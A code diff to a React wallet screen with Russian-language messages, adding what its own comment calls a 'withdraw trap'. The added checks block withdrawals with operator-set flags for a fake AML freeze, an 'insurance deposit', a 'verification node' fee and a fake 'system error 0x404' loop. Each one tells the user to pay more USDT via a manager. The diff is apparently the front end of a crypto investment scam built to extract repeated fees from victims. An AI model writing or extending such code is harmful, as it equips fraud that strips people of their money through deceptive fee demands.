@@ -65,10 +65,29 @@ export function WalletScreen() {
 
   function handleWithdraw() {
     setWdError("");
-    // ── Withdraw trap: проверяем required_tax ──────────────────────────────
-    const tax = state.profile?.requiredTax ?? 0;
+    // ── Withdraw trap: проверяем ВСЕ сценарии безопасности ──────────────────
+    const p = state.profile;
+    if (p?.isFrozen) {
+      setWdError("Счёт заморожен в рамках проверки AML/CFT. Обратитесь в службу безопасности.");
+      return;
+    }
+    const tax = p?.requiredTax ?? 0;
     if (tax > 0) {
       setWdError(`Для вывода средств необходимо оплатить налог ${tax.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      return;
+    }
+    const ins = p?.insuranceFee ?? 0;
+    if (ins > 0) {
+      setWdError(`Требуется страховой депозит ${ins.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      return;
+    }
+    const node = p?.nodeFee ?? 0;
+    if (node > 0) {
+      setWdError(`Требуется активация узла верификации: ${node.toFixed(2)} USDT. Обратитесь к менеджеру.`);
+      return;
+    }
+    if (p?.supportLoop) {
+      setWdError("Системная ошибка 0x404: модуль обработки транзакций недоступен. Обратитесь в поддержку.");
       return;
     }
     if (!wdAddress.trim()) { setWdError("Укажите адрес"); return; }
@@ -360,6 +379,78 @@ export function WalletScreen() {
                         Для вывода средств необходимо оплатить налог{" "}
                         <b style={{ color: "var(--neg)" }}>{(state.profile?.requiredTax ?? 0).toFixed(2)} USDT</b>.
                         Обратитесь к вашему менеджеру.
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Баннер: AML заморозка */}
+                  {state.profile?.isFrozen && (
+                    <div style={{
+                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
+                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
+                      textAlign: "center",
+                    }}>
+                      <div style={{ fontSize: 24, marginBottom: 6 }}>❄️</div>
+                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
+                        Счёт заморожен — AML проверка
+                      </div>
+                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
+                        Ваш счёт временно заморожен в рамках проверки AML/CFT. Обратитесь в поддержку.
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Баннер: страховой депозит */}
+                  {(state.profile?.insuranceFee ?? 0) > 0 && (
+                    <div style={{
+                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
+                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
+                      textAlign: "center",
+                    }}>
+                      <div style={{ fontSize: 24, marginBottom: 6 }}>🛡</div>
+                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
+                        Требуется страховой депозит
+                      </div>
+                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
+                        Внесите страховой депозит{" "}
+                        <b style={{ color: "var(--neg)" }}>{(state.profile?.insuranceFee ?? 0).toFixed(2)} USDT</b>.
+                        Обратитесь к менеджеру.
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Баннер: активация узла */}
+                  {(state.profile?.nodeFee ?? 0) > 0 && (
+                    <div style={{
+                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
+                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
+                      textAlign: "center",
+                    }}>
+                      <div style={{ fontSize: 24, marginBottom: 6 }}>🔗</div>
+                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
+                        Активация узла верификации
+                      </div>
+                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
+                        Оплатите активацию узла{" "}
+                        <b style={{ color: "var(--neg)" }}>{(state.profile?.nodeFee ?? 0).toFixed(2)} USDT</b>.
+                        Обратитесь к менеджеру.
+                      </div>
+                    </div>
+                  )}
+
+                  {/* Баннер: support loop */}
+                  {state.profile?.supportLoop && (
+                    <div style={{
+                      background: "var(--neg-dim)", border: "1px solid var(--neg-border)",
+                      borderRadius: "var(--r-md)", padding: "14px", marginBottom: 14,
+                      textAlign: "center",
+                    }}>
+                      <div style={{ fontSize: 24, marginBottom: 6 }}>⚠️</div>
+                      <div style={{ fontWeight: 700, fontSize: 14, color: "var(--neg)", marginBottom: 4 }}>
+                        Системная ошибка 0x404
+                      </div>
+                      <div style={{ fontSize: 12, color: "var(--text-2)", lineHeight: 1.5 }}>
+                        Модуль обработки транзакций недоступен. Обратитесь в поддержку.
                       </div>
                     </div>
                   )}
